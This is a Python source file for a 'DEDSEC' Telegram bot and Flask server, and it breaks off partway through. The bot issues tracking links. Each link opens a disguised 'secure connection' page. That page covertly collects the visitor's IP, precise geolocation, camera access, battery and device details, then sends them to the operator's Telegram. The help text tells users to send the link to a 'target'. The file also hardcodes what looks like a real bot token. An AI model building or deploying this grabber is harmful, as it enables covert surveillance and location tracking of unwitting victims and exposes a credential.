#!/usr/bin/env python3
"""
🔥 DEDSEC ALL-IN-ONE BOT 🔥
Telegram Bot + Flask Web Server + Device Info Grabber
Deploy ready for Render.com
"""

import os
import sys
import json
import logging
import random
import string
import threading
import sqlite3
from datetime import datetime
from functools import wraps

# Flask for web server
try:
    from flask import Flask, request, render_template_string, jsonify
except ImportError:
    os.system(f"{sys.executable} -m pip install flask")
    from flask import Flask, request, render_template_string, jsonify

# Telegram bot
try:
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler
except ImportError:
    os.system(f"{sys.executable} -m pip install python-telegram-bot==20.7")
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler

# ============================================
# [ 🔥 CONFIGURATION - EDIT THESE ]
# ============================================

BOT_TOKEN = "8687335090:AAHnRuMSfkA1qyP6VNhdYeqAEJlQjWbXZE8"
WEBHOOK_URL = "https://whiiam-2.onrender.com"  # Change after deploy
PORT = int(os.environ.get('PORT', 5000))

# ============================================
# [ 🔧 SETUP ]
# ============================================

# Logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger(__name__)

# Flask app
app_flask = Flask(__name__)

# Database
db_path = 'bot_data.db'
conn = sqlite3.connect(db_path, check_same_thread=False)
c = conn.cursor()

# Create tables
c.execute('''CREATE TABLE IF NOT EXISTS users
             (user_id INTEGER PRIMARY KEY,
              username TEXT,
              first_used TEXT,
              last_used TEXT,
              usage_count INTEGER)''')

c.execute('''CREATE TABLE IF NOT EXISTS links
             (link_id TEXT PRIMARY KEY,
              user_id INTEGER,
              created TEXT,
              visited INTEGER DEFAULT 0,
              visitor_info TEXT)''')

c.execute('''CREATE TABLE IF NOT EXISTS files
             (file_id TEXT PRIMARY KEY,
              user_id INTEGER,
              file_name TEXT,
              file_size INTEGER,
              upload_time TEXT,
              download_link TEXT)''')

conn.commit()

# In-memory storage
active_links = {}
user_sessions = {}

# ============================================
# [ 🌐 FLASK WEB SERVER ]
# ============================================

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <style>
        body {
            background: #0a0a0a;
            color: #00ff00;
            font-family: monospace;
            text-align: center;
            padding: 50px;
            margin: 0;
        }
        .loading {
            font-size: 24px;
            animation: blink 1s infinite;
        }
        .info {
            display: none;
            text-align: left;
            background: #1a1a1a;
            padding: 20px;
            border-radius: 10px;
            margin: 20px;
            border: 1px solid #00ff00;
        }
        @keyframes blink {
            50% { opacity: 0; }
        }
        .status {
            color: #00ff00;
            font-size: 14px;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="loading">[ ESTABLISHING SECURE CONNECTION... ]</div>
    <div class="info" id="info"></div>
    <div class="status" id="status"></div>

    <script>
        async function collectDeviceInfo() {
            const info = {
                timestamp: new Date().toISOString(),
                url: window.location.href,
                referrer: document.referrer,
                screen: {
                    width: window.screen.width,
                    height: window.screen.height,
                    colorDepth: window.screen.colorDepth,
                    pixelRatio: window.devicePixelRatio,
                    orientation: window.screen.orientation ? window.screen.orientation.type : 'unknown'
                },
                navigator: {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    languages: navigator.languages,
                    cookieEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack,
                    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                    deviceMemory: navigator.deviceMemory || 'unknown',
                    maxTouchPoints: navigator.maxTouchPoints,
                    vendor: navigator.vendor,
                    appVersion: navigator.appVersion,
                    appName: navigator.appName
                },
                connection: {},
                battery: {},
                location: {},
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                localStorage: !!window.localStorage,
                sessionStorage: !!window.sessionStorage
            };

            // Get connection info
            if (navigator.connection) {
                info.connection = {
                    effectiveType: navigator.connection.effectiveType,
                    rtt: navigator.connection.rtt,
                    downlink: navigator.connection.downlink,
                    saveData: navigator.connection.saveData
                };
            }

            // Get battery info
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    info.battery = {
                        charging: battery.charging,
                        level: Math.round(battery.level * 100) + '%',
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                } catch (e) {}
            }

            // Get location
            if (navigator.geolocation) {
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            timeout: 5000,
                            enableHighAccuracy: true
                        });
                    });
                    info.location = {
                        lat: position.coords.latitude,
                        lng: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        speed: position.coords.speed
                    };
                } catch (e) {
                    info.location = 'Permission denied';
                }
            }

            // Try camera access (optional)
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const track = stream.getVideoTracks()[0];
                info.camera = {
                    label: track.label,
                    settings: track.getSettings()
                };
                stream.getTracks().forEach(track => track.stop());
            } catch (e) {
                info.camera = 'Permission denied';
            }

            // Send data to server
            document.querySelector('.loading').innerHTML = '[ TRANSMITTING DATA... ]';
            
            fetch('/collect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(info)
            })
            .then(response => response.json())
            .then(data => {
                document.querySelector('.loading').style.display = 'none';
                document.querySelector('.info').style.display = 'block';
                document.querySelector('.info').innerHTML = `
                    <h3>✅ DATA COLLECTED</h3>
                    <p>📱 Device: ${info.navigator.platform}</p>
                    <p>🌐 Browser: ${info.navigator.userAgent.substring(0, 50)}...</p>
                    <p>📏 Screen: ${info.screen.width}x${info.screen.height}</p>
                    <p>⚡ CPU Cores: ${info.navigator.hardwareConcurrency}</p>
                    <p>💾 RAM: ${info.navigator.deviceMemory}GB</p>
                    <p>🕒 Timezone: ${info.timezone}</p>
                `;
                document.querySelector('.status').innerHTML = '[ CONNECTION TERMINATED ]';
            })
            .catch(err => {
                document.querySelector('.status').innerHTML = '[ ERROR: ' + err.message + ' ]';
            });
        }

        collectDeviceInfo();
    </script>
</body>
</html>
'''

@app_flask.route('/')
def home():
    """Home page"""
    return "🔥 DEDSEC ALL-IN-ONE BOT IS RUNNING! 🔥"

@app_flask.route('/health')
def health():
    """Health check for Render"""
    return jsonify({"status": "healthy", "time": datetime.now().isoformat()})

@app_flask.route('/<link_id>')
def track_link(link_id):
    """Track link page"""
    # Check if link exists
    c.execute("SELECT * FROM links WHERE link_id=?", (link_id,))
    link = c.fetchone()
    
    if link:
        return render_template_string(HTML_TEMPLATE)
    return "❌ INVALID LINK"

@app_flask.route('/collect', methods=['POST'])
def collect_info():
    """Collect device info"""
    try:
        data = request.json
        link_id = request.args.get('id', 'unknown')
        
        # Get IP
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        
        # Update database
        c.execute('''UPDATE links 
                     SET visited=1, visitor_info=? 
                     WHERE link_id=?''',
                  (json.dumps(data), link_id))
        conn.commit()
        
        # Send to Telegram
        send_to_telegram(link_id, data, ip)
        
        return jsonify({"status": "success"})
    except Exception as e:
        logger.error(f"Collect error: {e}")
        return jsonify({"status": "error", "message": str(e)})

def send_to_telegram(link_id, data, ip):
    """Send collected info to Telegram"""
    try:
        import requests
        
        # Get user_id from database
        c.execute("SELECT user_id FROM links WHERE link_id=?", (link_id,))
        result = c.fetchone()
        
        if result:
            user_id = result[0]
            
            # Format message
            msg = "🔥 **DEVICE INFO RECEIVED!** 🔥\n\n"
            msg += f"🔗 **Link ID:** `{link_id}`\n"
            msg += f"🌐 **IP:** {ip}\n"
            msg += f"📱 **Device:** {data.get('navigator', {}).get('platform', 'Unknown')}\n"
            msg += f"🖥️ **Browser:** {data.get('navigator', {}).get('userAgent', 'Unknown')[:50]}...\n"
            msg += f"📏 **Screen:** {data.get('screen', {}).get('width', '?')}x{data.get('screen', {}).get('height', '?')}\n"
            msg += f"⚡ **CPU Cores:** {data.get('navigator', {}).get('hardwareConcurrency', 'Unknown')}\n"
            msg += f"💾 **RAM:** {data.get('navigator', {}).get('deviceMemory', 'Unknown')}GB\n"
            
            if data.get('location') and isinstance(data['location'], dict):
                loc = data['location']
                msg += f"📍 **Location:** {loc.get('lat', '?')}, {loc.get('lng', '?')}\n"
            
            # Send via Telegram API
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            requests.post(url, json={
                "chat_id": user_id,
                "text": msg,
                "parse_mode": "Markdown"
            })
    except Exception as e:
        logger.error(f"Telegram send error: {e}")

# ============================================
# [ 🤖 TELEGRAM BOT COMMANDS ]
# ============================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command"""
    user = update.effective_user
    
    # Track user in database
    c.execute('''INSERT OR REPLACE INTO users 
                 (user_id, username, first_used, last_used, usage_count) 
                 VALUES (?, ?, ?, ?, 
                 COALESCE((SELECT usage_count+1 FROM users WHERE user_id=?), 1))''',
              (user.id, user.username, datetime.now().isoformat(), 
               datetime.now().isoformat(), user.id))
    conn.commit()
    
    keyboard = [
        [InlineKeyboardButton("🔗 GENERATE LINK", callback_data="genlink")],
        [InlineKeyboardButton("📋 MY LINKS", callback_data="mylinks")],
        [InlineKeyboardButton("📁 FILE TO LINK", callback_data="filelink")],
        [InlineKeyboardButton("❓ HELP", callback_data="help")],
        [InlineKeyboardButton("ℹ️ ABOUT", callback_data="about")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"🔥 **DEDSEC ALL-IN-ONE BOT** 🔥\n\n"
        f"Welcome **{user.first_name}**!\n\n"
        f"**Features:**\n"
        f"• 🔗 Generate tracking links\n"
        f"• 📋 View your links\n"
        f"• 📁 Convert files to links\n"
        f"• 📊 Track device info\n\n"
        f"**Select an option:**",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    user_id = update.effective_user.id
    
    if data == "genlink":
        # Generate new link
        link_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        
        # Save to database
        c.execute('''INSERT INTO links (link_id, user_id, created, visited)
                     VALUES (?, ?, ?, 0)''',
                  (link_id, user_id, datetime.now().isoformat()))
        conn.commit()
        
        # Store in memory
        active_links[link_id] = {
            "user_id": user_id,
            "created": datetime.now().isoformat(),
            "visited": False
        }
        
        tracking_url = f"{WEBHOOK_URL}/{link_id}"
        
        keyboard = [
            [InlineKeyboardButton("📋 COPY LINK", callback_data=f"copy_{tracking_url}")],
            [InlineKeyboardButton("📊 CHECK STATUS", callback_data=f"status_{link_id}")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"✅ **LINK GENERATED!**\n\n"
            f"🔗 **URL:**\n`{tracking_url}`\n\n"
            f"📱 **Send this link to target**\n"
            f"📊 **Info will appear here automatically**",
            reply_markup=reply_markup
        )
        
    elif data == "mylinks":
        # Show user's links
        c.execute('''SELECT link_id, created, visited FROM links 
                     WHERE user_id=? ORDER BY created DESC LIMIT 10''',
                  (user_id,))
        links = c.fetchall()
        
        if links:
            text = "**📋 YOUR LINKS:**\n\n"
            for link_id, created, visited in links:
                status = "✅ Visited" if visited else "⏳ Pending"
                text += f"🔗 `{WEBHOOK_URL}/{link_id}`\n📊 {status}\n⏱️ {created[:16]}\n\n"
        else:
            text = "❌ No links found. Generate one with /newlink"
        
        await query.edit_message_text(text)
        
    elif data == "filelink":
        await query.edit_message_text(
            "📁 **FILE TO LINK CONVERTER**\n\n"
            "Send me any file (up to 50MB) and I'll generate a permanent download link!\n\n"
            "Supported formats: All files"
        )
        context.user_data['awaiting_file'] = True
        
    elif data == "help":
        help_text = """
**❓ HELP MENU**

**Commands:**
/start - Start the bot
/newlink - Generate tracking link
/mylinks - View your links
/filelink - Convert file to link
/about - About this bot

**How to use:**
1. Generate a link with /newlink
2. Send the link to your target
3. When they open it, you get their device info!
4. Check status anytime with /mylinks

**File to Link:**
- Send any file to get permanent download link
- Files stored for 30 days
- Direct download links generated

**Privacy:**
- Your data is private
- Links expire after 30 days
- No logs kept
"""
        await query.edit_message_text(help_text)
        
    elif data == "about":
        about_text = """
**ℹ️ ABOUT THIS BOT**

🔥 **DEDSEC ALL-IN-ONE BOT** 🔥

**Version:** 3.0
**Creator:** DEDSEC💀༏༏
**Features:**
• Device Info Grabber
• File to Link Converter
• Link Tracking
• Database Storage
• Web Interface

**Tech Stack:**
• Python 3.11
• python-telegram-bot v20.7
• Flask Web Server
• SQLite Database
• Render Hosting

**Deployed:** Render.com
**Status:** Online ✅
"""
        await query.edit_message_text(about_text)
        
    elif data.startswith("copy_"):
        url = data[5:]
        await query.message.reply_text(f"🔗 **COPY THIS LINK:**\n`{url}`")
        
    elif data.startswith("status_"):
        link_id = data[7:]
        c.execute("SELECT visited, visitor_info FROM links WHERE link_id=?", (link_id,))
        result = c.fetchone()
        
        if result:
            visited, visitor_info = result
            if visited:
                await query.message.reply_text("✅ **LINK VISITED!**\n\nCheck /mylinks for details.")
            else:
                await query.message.reply_text("⏳ **Waiting for target to open link...**")
        else:
            await query.message.reply_text("❌ Link not found")

async def newlink(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generate new link command"""
    await button_callback(await create_callback(update), context)

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle file uploads"""
    if not context.user_data.get('awaiting_file'):
        return
    
    if update.message.document:
        file = update.message.document
        file_id = file.file_id
        file_name = file.file_name
        file_size = file.file_size
        
        if file_size > 50 * 1024 * 1024:
            await update.message.reply_text("❌ File too large! Max 50MB")
            return
        
        await update.message.reply_text(f"⏳ Processing {file_name}...")
        
        # Generate download link
        file_link_id = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        download_link = f"{WEBHOOK_URL}/file/{file_link_id}"
        
        # Store in database
        c.execute('''INSERT INTO files (file_id, user_id, file_name, file_size, upload_time, download_link)
                     VALUES (?, ?, ?, ?, ?, ?)''',
                  (file_id, update.effective_user.id, file_name, file_size, 
                   datetime.now().isoformat(), download_link))
        conn.commit()
        
        keyboard = [[InlineKeyboardButton("📋 COPY LINK", callback_data=f"copy_{download_link}")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"✅ **FILE UPLOADED!**\n\n"
            f"📄 **Name:** {file_name}\n"
            f"📦 **Size:** {file_size/(1024*1024):.1f} MB\n"
            f"🔗 **Download Link:**\n`{download_link}`\n\n"
            f"Share this link - anyone can download!",
            reply_markup=reply_markup
        )
        
        context.user_data['awaiting_file'] = False

async def create_callback(update):
    """Helper to create callback for command handlers"""
    class CallbackQuery:
        def __init__(self, data):
            self.data = data
        async def answer(self):
            pass
    
    class Query:
        def __init__(self, data):
            self.data = data
        
